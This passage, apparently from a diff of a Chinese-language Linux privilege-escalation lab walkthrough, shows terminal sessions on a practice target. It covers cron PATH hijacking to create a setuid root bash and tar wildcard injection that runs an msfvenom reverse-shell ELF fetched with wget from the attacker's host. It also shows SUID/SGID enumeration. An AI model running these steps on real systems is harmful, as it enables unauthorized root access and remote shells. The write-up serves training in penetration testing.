+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; *    * * *   root    cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.hourly
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;    * * *   root    test -x /usr/sbin/anacron &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.daily &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;    * * &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;   root    test -x /usr/sbin/anacron &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.weekly &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; * *   root    test -x /usr/sbin/anacron &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.monthly &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * root overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * root /usr/local/bin/compress.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ locate overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;locate: warning: database &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/var/cache/locate/locatedb&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; is more than &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; days old &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;actual age is 945.4 days&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/local/bin/overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ ls -l /usr/local/bin/overwrite.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr--rw- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root staff &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; /usr/local/bin/overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ vim overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;第二cron-path环境变量&#34;&gt;第二cron-PATH环境变量&lt;/h2&gt;
+&lt;p&gt;查看系统范围的crontab的内容：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;cat /etc/crontab&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;请注意，PATH 变量以 &lt;strong&gt;/home/user&lt;/strong&gt;开头，这是我们用户的主目录。&lt;/p&gt;
+&lt;p&gt;使用以下内容在您的主目录中创建一个名为&lt;strong&gt;overwrite.sh的文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;#!/bin/bash&lt;/p&gt;
+&lt;p&gt;cp /bin/bash /tmp/rootbash&lt;br&gt;
+chmod +xs /tmp/rootbash&lt;/p&gt;
+&lt;p&gt;确保该文件是可执行的：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;chmod +x /home/user/overwrite.sh&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;等待 cron job运行起来。 使用 -p 运行 /tmp/rootbash 命令以获得以 root 权限运行的 shell：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;/tmp/rootbash -p&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ ssh user@10.10.131.192 -oHostKeyAlgorithms&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;+ssh-rsa
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The authenticity of host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.10.131.192 (10.10.131.192)&amp;#39;&lt;/span&gt; can&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t be established.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;This host key is known by the following other names/addresses:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ~/.ssh/known_hosts:14: [hashed name]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ~/.ssh/known_hosts:15: [hashed name]
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Warning: Permanently added &amp;#39;&lt;/span&gt;10.10.131.192&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; (RSA) to the list of known hosts.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;user@10.10.131.192&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Linux debian 2.6.32-5-amd64 &lt;span style=&#34;color:#75715e&#34;&gt;#1 SMP Tue May 13 16:34:35 UTC 2014 x86_64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;The programs included with the Debian GNU/Linux system are free software;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;the exact distribution terms &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; each program are described in the
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;individual files in /usr/share/doc/*/copyright.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;permitted by applicable law.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last login: Fri May &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 06:41:23 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; from 192.168.1.125
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ cat /etc/crontab 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# command to install the new version when you edit this file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# that none of the other crontabs do.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SHELL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# m h dom mon dow user  command&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; *    * * *   root    cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.hourly
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;    * * *   root    test -x /usr/sbin/anacron &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.daily &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;    * * &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;   root    test -x /usr/sbin/anacron &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.weekly &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; * *   root    test -x /usr/sbin/anacron &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; cd / &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts --report /etc/cron.monthly &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * root overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;* * * * * root /usr/local/bin/compress.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ vim overwrite.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ chmod +x /home/user/overwrite.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ /tmp/rootbash -p
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-bash: /tmp/rootbash: No such file or directory
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ /tmp/rootbash -p
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rootbash-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;cron-job-通配符&#34;&gt;cron job-通配符&lt;/h2&gt;
+&lt;p&gt;查看另一个cron-job&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ cat /usr/local/bin/compress.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /home/user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar czf /tmp/backup.tar.gz *
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;主目录中使用通配符 (*) 运行 tar 命令&lt;/p&gt;
+&lt;p&gt;好了在kali机中使用msfvenom生成shell&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.131.192 LPORT=4444 -f elf -o shell.elf&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;使用wget到我们的目标主机&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ wget http://10.14.33.41:8089/shell.elf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--2022-12-17 09:35:13--  http://10.14.33.41:8089/shell.elf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connecting to 10.14.33.41:8089... connected.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP request sent, awaiting response... &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;194&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;application/octet-stream&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Saving to: “shell.elf”
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;100%&lt;span style=&#34;color:#f92672&#34;&gt;[==================================================================================================================&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;194&lt;/span&gt;         --.-K/s   in 0s  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2022-12-17 09:35:14 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;43.0 MB/s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; - “shell.elf” saved &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;194/194&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后改变文件权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ chmod +x shell.elf 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ touch /home/user/ --checkpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ touch /home/user/--checkpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ touch /home/user/--checkpoint-action&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;shell.elf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;随后&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm /home/user/shell.elf
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm /home/user/--checkpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rm /home/user/--checkpoint-action&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;shell.elf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;防止cron再次执行&lt;/p&gt;
+&lt;h1 id=&#34;0x7-suid--sgid&#34;&gt;0x7 SUID / SGID&lt;/h1&gt;
+&lt;p&gt;在目标机中找到所有SUID/SGID可执行文件&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&amp;gt; /dev/null&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ find / -type f -a &lt;span style=&#34;color:#ae81ff&#34;&gt;\(&lt;/span&gt; -perm -u+s -o -perm -g+s &lt;span style=&#34;color:#ae81ff&#34;&gt;\)&lt;/span&gt; -exec ls -l &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\;&lt;/span&gt; 2&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root shadow &lt;span style=&#34;color:#ae81ff&#34;&gt;19528&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/expiry
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root ssh &lt;span style=&#34;color:#ae81ff&#34;&gt;108600&lt;/span&gt; Apr  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt; /usr/bin/ssh-agent
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;37552&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/chsh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;168136&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; /usr/bin/sudo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root tty &lt;span style=&#34;color:#ae81ff&#34;&gt;11000&lt;/span&gt; Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; /usr/bin/bsd-write
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root crontab &lt;span style=&#34;color:#ae81ff&#34;&gt;35040&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; /usr/bin/crontab
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;32808&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/newgrp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;168136&lt;/span&gt; Jan  &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; /usr/bin/sudoedit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root shadow &lt;span style=&#34;color:#ae81ff&#34;&gt;56976&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/chage
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;43280&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/passwd
